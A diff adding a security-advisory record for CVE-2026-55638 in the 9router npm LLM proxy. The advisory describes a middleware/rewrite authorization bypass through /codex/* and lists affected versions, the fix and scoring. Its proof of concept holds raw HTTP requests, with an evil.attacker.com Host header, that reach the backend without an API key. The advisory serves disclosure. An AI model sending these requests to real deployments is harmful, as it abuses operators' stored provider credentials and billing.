@@ -1,0 +1,423 @@
+advisory_id: GHSA-8gmq-j984-vp4r
+datasource_id: github_osv/GHSA-8gmq-j984-vp4r
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8gmq-j984-vp4r/GHSA-8gmq-j984-vp4r.json
+aliases:
+  - CVE-2026-55638
+summary: |
+  9router: Unauthenticated LLM proxy access via /codex rewrite authorization bypass
+  ## Summary
+
+  9router exposes an OpenAI/Anthropic-compatible LLM proxy. Remote access to this proxy is intended to be protected by an API-key check in the Next.js middleware.
+
+  However, 9router also defines a rewrite that maps `/codex/*` to the backend LLM endpoint `/api/v1/responses`. The middleware authorization decision is made on the incoming request path before the rewrite is applied. Because `/codex` is not included in the middleware's protected LLM API prefix list, requests to `/codex/*` bypass the API-key gate and are later rewritten to the same backend used by `/api/v1/responses`.
+
+  As a result, an unauthenticated remote attacker can access the LLM proxy through `/codex/*` and cause the server to make upstream provider calls using the operator-stored LLM provider credentials.
+
+  ## Details
+
+  | Component                     | File                                | Note                                                                      |
+  | ----------------------------- | ----------------------------------- | ------------------------------------------------------------------------- |
+  | Middleware authorization gate | `src/dashboardGuard.js`             | Protects `/v1`, `/v1beta`, `/api/v1`, and `/api/v1beta`, but not `/codex` |
+  | Rewrite configuration         | `next.config.mjs`                   | Rewrites `/codex/:path*` to `/api/v1/responses`                           |
+  | LLM backend route             | `src/app/api/v1/responses/route.js` | Dispatches rewritten requests to the LLM handler                          |
+  | Chat handler                  | `src/sse/handlers/chat.js`          | Uses operator-stored provider credentials for upstream calls              |
+
+  Tested version:
+
+  | Version / Commit                                             | Runtime          | Status   |
+  | ------------------------------------------------------------ | ---------------- | -------- |
+  | `v0.4.80`, commit `23da7b1fe3bb8edd2bdbdb63fbbb15a476b02c56` | Next.js `16.2.9` | Affected |
+
+  ### Root Cause
+
+  The middleware classifies requests by the original incoming pathname. The protected public LLM API prefixes are:
+
+  ```js
+  PUBLIC_PREFIXES = ["/v1", "/v1beta", "/api/v1", "/api/v1beta"];
+  ```
+
+  Because `/codex` is not included in this list, a request such as `/codex/x` does not enter the LLM API authorization branch and falls through to:
+
+  ```js
+  return NextResponse.next();
+  ```
+
+  The rewrite configuration then maps the allowed request to the protected backend route:
+
+  ```js
+  {
+    source: "/codex/:path*",
+    destination: "/api/v1/responses"
+  }
+  ```
+
+  The backend route reaches the same handler used by the canonical LLM endpoint:
+
+  ```js
+  return await handleChat(request);
+  ```
+
+  The handler then processes the request and performs the upstream LLM provider call. In the tested configuration, the handler does not repeat the same middleware API-key gate for remote callers, so the rewritten request is served after bypassing the intended authorization check.
+
+  ## PoC
+
+  The following requests use the same target server and the same remote-style `Host` header. The only meaningful difference is the request path.
+
+  ### Case 01 — Protected canonical endpoint rejects unauthenticated access
+
+  ```http
+  POST /api/v1/responses HTTP/1.1
+  Host: evil.attacker.com
+  Content-Type: application/json
+  Content-Length: 156
+
+  {"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
+  ```
+
+  Observed result:
+
+  ```http
+  HTTP/1.1 401 Unauthorized
+  ```
+
+  This confirms that the canonical `/api/v1/responses` path is protected by the intended API-key gate.
+
+  ### Case 02 — Rewritten `/codex/*` path bypasses the API-key gate
+
+  ```http
+  POST /codex/x HTTP/1.1
+  Host: evil.attacker.com
+  Content-Type: application/json
+  Content-Length: 156
+
+  {"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
+  ```
+
+  Observed result:
+
+  ```http
+  HTTP/1.1 200 OK
+  ```
+
+  The request reaches the LLM backend without an API key.
+
+  A controlled upstream provider endpoint recorded the outbound request from 9router:
+
+  ```text
+  POST /responses
+  Authorization: Bearer NINEROUTER_OPERATOR_STORED_KEY_MARKER
+  request-body marker present: true
+  operator key marker in Authorization: true
+  ```
+
+  This confirms that the unauthenticated `/codex/*` request causes 9router to make an upstream provider call using the operator-stored credentials.
+
+  ### Case 03 — Unrelated unknown path does not reach the backend
+
+  ```http
+  POST /notcodex/x HTTP/1.1
+  Host: evil.attacker.com
+  Content-Type: application/json
+  Content-Length: 156
+
+  {"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
+  ```
+
+  Observed result:
+
+  ```http
+  HTTP/1.1 404 Not Found
+  ```
+
+  No upstream provider call is made. This isolates the issue to the `/codex/*` rewrite.
+
+  ### Case 04 — Canonical endpoint succeeds only with a valid API key
+
+  ```http
+  POST /api/v1/responses HTTP/1.1
+  Host: evil.attacker.com
+  Authorization: Bearer sk-REDACTED
+  Content-Type: application/json
+  Content-Length: 156
+
+  {"model":"fakeoai/x","input":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello","messages":[{"role":"user","content":"NINEROUTER_CODEX_AUTH_BYPASS_MARKER hello"}]}
+  ```
+
+  Observed result:
+
+  ```http
+  HTTP/1.1 200 OK
+  ```
+
+  This confirms that the canonical endpoint is functional and that the `401` response in Case 01 is an authorization failure, not a backend error.
+
+  ## Attack Scenario
+
+  1. A remote attacker identifies a publicly reachable 9router instance.
+  2. The attacker sends LLM proxy requests to `/codex/*` instead of `/api/v1/responses`.
+  3. The middleware evaluates the original `/codex/*` path and does not apply the LLM API-key gate.
+  4. The rewrite maps the request to `/api/v1/responses`.
+  5. The backend processes the request and performs an upstream provider call.
+  6. The upstream call uses the operator-stored provider credentials.
+
+  ## Impact
+
+  A successful attacker can use the operator's configured LLM provider account without authentication.
+
+  Likely consequences include:
+
+  * Unauthorized use of the 9router LLM proxy.
+  * Consumption of the operator's provider credits or quota.
+  * Unexpected billing impact.
+  * Abuse of configured OpenAI/Anthropic-compatible providers.
+  * Exposure of model/provider behavior through proxy responses.
+  * Bypass of the intended API-key access control for remote LLM proxy access.
+impacted_packages:
+  - purl: pkg:npm/9router
+    affected_versions: vers:npm/<0.5.2
+    fixed_versions: vers:npm/0.5.2
+    affected_packages:
+      - pkg:npm/9router@0.2.13
+      - pkg:npm/9router@0.2.14
+      - pkg:npm/9router@0.2.15
+      - pkg:npm/9router@0.2.16
+      - pkg:npm/9router@0.2.17
+      - pkg:npm/9router@0.2.18
+      - pkg:npm/9router@0.2.19
+      - pkg:npm/9router@0.2.20
+      - pkg:npm/9router@0.2.21
+      - pkg:npm/9router@0.2.22
+      - pkg:npm/9router@0.2.23
+      - pkg:npm/9router@0.2.24
+      - pkg:npm/9router@0.2.25
+      - pkg:npm/9router@0.2.26
+      - pkg:npm/9router@0.2.27
+      - pkg:npm/9router@0.2.29
+      - pkg:npm/9router@0.2.30
+      - pkg:npm/9router@0.2.31
+      - pkg:npm/9router@0.2.32
+      - pkg:npm/9router@0.2.33
+      - pkg:npm/9router@0.2.34
+      - pkg:npm/9router@0.2.36
+      - pkg:npm/9router@0.2.37
+      - pkg:npm/9router@0.2.38
+      - pkg:npm/9router@0.2.39
+      - pkg:npm/9router@0.2.40
+      - pkg:npm/9router@0.2.41
+      - pkg:npm/9router@0.2.42
+      - pkg:npm/9router@0.2.43
+      - pkg:npm/9router@0.2.44
+      - pkg:npm/9router@0.2.45
+      - pkg:npm/9router@0.2.46
+      - pkg:npm/9router@0.2.47
+      - pkg:npm/9router@0.2.48
+      - pkg:npm/9router@0.2.49
+      - pkg:npm/9router@0.2.50
+      - pkg:npm/9router@0.2.51
+      - pkg:npm/9router@0.2.52
+      - pkg:npm/9router@0.2.53
+      - pkg:npm/9router@0.2.54
+      - pkg:npm/9router@0.2.56
+      - pkg:npm/9router@0.2.57
+      - pkg:npm/9router@0.2.58
+      - pkg:npm/9router@0.2.59
+      - pkg:npm/9router@0.2.60
+      - pkg:npm/9router@0.2.61
+      - pkg:npm/9router@0.2.62
+      - pkg:npm/9router@0.2.63
+      - pkg:npm/9router@0.2.64
+      - pkg:npm/9router@0.2.65
+      - pkg:npm/9router@0.2.66
+      - pkg:npm/9router@0.2.67
+      - pkg:npm/9router@0.2.68
+      - pkg:npm/9router@0.2.70
+      - pkg:npm/9router@0.2.71
+      - pkg:npm/9router@0.2.72
+      - pkg:npm/9router@0.2.73
+      - pkg:npm/9router@0.2.74
+      - pkg:npm/9router@0.2.75
+      - pkg:npm/9router@0.2.76
+      - pkg:npm/9router@0.2.77
+      - pkg:npm/9router@0.2.78
+      - pkg:npm/9router@0.2.79
+      - pkg:npm/9router@0.2.80
+      - pkg:npm/9router@0.2.81
+      - pkg:npm/9router@0.2.83
+      - pkg:npm/9router@0.2.84
+      - pkg:npm/9router@0.2.87
+      - pkg:npm/9router@0.2.88
+      - pkg:npm/9router@0.2.89
+      - pkg:npm/9router@0.2.90
+      - pkg:npm/9router@0.2.91
+      - pkg:npm/9router@0.2.92
+      - pkg:npm/9router@0.2.93
+      - pkg:npm/9router@0.2.94
+      - pkg:npm/9router@0.2.95
+      - pkg:npm/9router@0.2.96
+      - pkg:npm/9router@0.2.97
+      - pkg:npm/9router@0.2.98
+      - pkg:npm/9router@0.3.3
+      - pkg:npm/9router@0.3.5
+      - pkg:npm/9router@0.3.6
+      - pkg:npm/9router@0.3.7
+      - pkg:npm/9router@0.3.8
+      - pkg:npm/9router@0.3.9
+      - pkg:npm/9router@0.3.10
+      - pkg:npm/9router@0.3.11
+      - pkg:npm/9router@0.3.12
+      - pkg:npm/9router@0.3.13
+      - pkg:npm/9router@0.3.14
+      - pkg:npm/9router@0.3.15
+      - pkg:npm/9router@0.3.16
+      - pkg:npm/9router@0.3.17
+      - pkg:npm/9router@0.3.19
+      - pkg:npm/9router@0.3.20
+      - pkg:npm/9router@0.3.21
+      - pkg:npm/9router@0.3.22
+      - pkg:npm/9router@0.3.23
+      - pkg:npm/9router@0.3.24
+      - pkg:npm/9router@0.3.27
+      - pkg:npm/9router@0.3.28
+      - pkg:npm/9router@0.3.29
+      - pkg:npm/9router@0.3.30
+      - pkg:npm/9router@0.3.31
+      - pkg:npm/9router@0.3.32
+      - pkg:npm/9router@0.3.33
+      - pkg:npm/9router@0.3.34
+      - pkg:npm/9router@0.3.35
+      - pkg:npm/9router@0.3.36
+      - pkg:npm/9router@0.3.40
+      - pkg:npm/9router@0.3.41
+      - pkg:npm/9router@0.3.42
+      - pkg:npm/9router@0.3.44
+      - pkg:npm/9router@0.3.46
+      - pkg:npm/9router@0.3.47
+      - pkg:npm/9router@0.3.48
+      - pkg:npm/9router@0.3.49
+      - pkg:npm/9router@0.3.50
+      - pkg:npm/9router@0.3.51
+      - pkg:npm/9router@0.3.52
+      - pkg:npm/9router@0.3.53
+      - pkg:npm/9router@0.3.54
+      - pkg:npm/9router@0.3.55
+      - pkg:npm/9router@0.3.56
+      - pkg:npm/9router@0.3.57
+      - pkg:npm/9router@0.3.58
+      - pkg:npm/9router@0.3.60
+      - pkg:npm/9router@0.3.61
+      - pkg:npm/9router@0.3.62
+      - pkg:npm/9router@0.3.63
+      - pkg:npm/9router@0.3.64
+      - pkg:npm/9router@0.3.65
+      - pkg:npm/9router@0.3.66
+      - pkg:npm/9router@0.3.68
+      - pkg:npm/9router@0.3.69
+      - pkg:npm/9router@0.3.70
+      - pkg:npm/9router@0.3.71
+      - pkg:npm/9router@0.3.72
+      - pkg:npm/9router@0.3.74
+      - pkg:npm/9router@0.3.75
+      - pkg:npm/9router@0.3.76
+      - pkg:npm/9router@0.3.78
+      - pkg:npm/9router@0.3.79
+      - pkg:npm/9router@0.3.80
+      - pkg:npm/9router@0.3.81
+      - pkg:npm/9router@0.3.82
+      - pkg:npm/9router@0.3.83
+      - pkg:npm/9router@0.3.84
+      - pkg:npm/9router@0.3.85
+      - pkg:npm/9router@0.3.87
+      - pkg:npm/9router@0.3.89
+      - pkg:npm/9router@0.3.90
+      - pkg:npm/9router@0.3.91
+      - pkg:npm/9router@0.3.96
+      - pkg:npm/9router@0.3.97
+      - pkg:npm/9router@0.3.98
+      - pkg:npm/9router@0.3.99
+      - pkg:npm/9router@0.4.1
+      - pkg:npm/9router@0.4.2
+      - pkg:npm/9router@0.4.3
+      - pkg:npm/9router@0.4.5
+      - pkg:npm/9router@0.4.6
+      - pkg:npm/9router@0.4.8
+      - pkg:npm/9router@0.4.9
+      - pkg:npm/9router@0.4.10
+      - pkg:npm/9router@0.4.11
+      - pkg:npm/9router@0.4.12
+      - pkg:npm/9router@0.4.13
+      - pkg:npm/9router@0.4.14
+      - pkg:npm/9router@0.4.15
+      - pkg:npm/9router@0.4.16
+      - pkg:npm/9router@0.4.17
+      - pkg:npm/9router@0.4.18
+      - pkg:npm/9router@0.4.19
+      - pkg:npm/9router@0.4.20
+      - pkg:npm/9router@0.4.25
+      - pkg:npm/9router@0.4.26
+      - pkg:npm/9router@0.4.27
+      - pkg:npm/9router@0.4.28
+      - pkg:npm/9router@0.4.29
+      - pkg:npm/9router@0.4.31
+      - pkg:npm/9router@0.4.33
+      - pkg:npm/9router@0.4.36
+      - pkg:npm/9router@0.4.37
+      - pkg:npm/9router@0.4.39
+      - pkg:npm/9router@0.4.41
+      - pkg:npm/9router@0.4.45
+      - pkg:npm/9router@0.4.46
+      - pkg:npm/9router@0.4.49
+      - pkg:npm/9router@0.4.50
+      - pkg:npm/9router@0.4.52
+      - pkg:npm/9router@0.4.55
+      - pkg:npm/9router@0.4.58
+      - pkg:npm/9router@0.4.59
+      - pkg:npm/9router@0.4.62
+      - pkg:npm/9router@0.4.63
+      - pkg:npm/9router@0.4.66
+      - pkg:npm/9router@0.4.71
+      - pkg:npm/9router@0.4.80
+    fixed_packages:
+      - pkg:npm/9router@0.5.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/decolua/9router
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/decolua/9router
+        commit: b282f0554972ea35281520738759d76abcd0b0b3
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8gmq-j984-vp4r/GHSA-8gmq-j984-vp4r.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-862
+  - CWE-863
+references:
+  - url: https://github.com/decolua/9router
+    reference_type:
+    reference_id:
+  - url: https://github.com/decolua/9router/commit/b282f0554972ea35281520738759d76abcd0b0b3
+    reference_type: other
+    reference_id: b282f0554972ea35281520738759d76abcd0b0b3
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-55638
+    reference_type:
+    reference_id: CVE-2026-55638
+  - url: https://github.com/decolua/9router/security/advisories/GHSA-8gmq-j984-vp4r
+    reference_type: other
+    reference_id: GHSA-8gmq-j984-vp4r
+  - url: https://github.com/decolua/9router/releases/tag/v0.5.2
+    reference_type: other
+    reference_id: v0.5.2
+exploits: []
